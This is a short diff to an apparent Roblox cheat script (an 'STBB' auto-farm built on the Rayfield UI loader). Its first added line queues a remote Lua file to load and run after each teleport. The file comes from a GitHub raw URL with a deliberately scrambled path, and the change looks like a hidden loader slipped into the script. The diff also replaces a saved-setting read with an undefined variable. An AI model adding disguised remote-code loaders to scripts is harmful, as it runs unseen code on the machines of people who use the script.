@@ -1,3 +1,4 @@
+queue_on_teleport(game:HttpGet('https://raw.githubusercontent.com/qianchengawa/dM2-lF9-pY3-sF3-eA8.aN5-bB5-cD8-yA0-bR4-/refs/heads/main/iB3%3DnU1.oI6.lO6%3CzX8%25eH0%7DfX5%23oR9_lL4%3BpY0-.lua'))
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
 	Name = 'STBB',
@@ -58,7 +59,7 @@ local dif = Tab:CreateDropdown({
 		'VeryHard',
 		'Zombie',
 	},
-	CurrentOption = {isfile('TDM/STBBAutoFarm/Dif.json') and readfile('TDM/STBBAutoFarm/Dif.json') or 'Zombie'},
+	CurrentOption = {diff},
 	MultipleOptions = false,
 	Flag = 'Dropdown1',
 	Callback = function(Options)
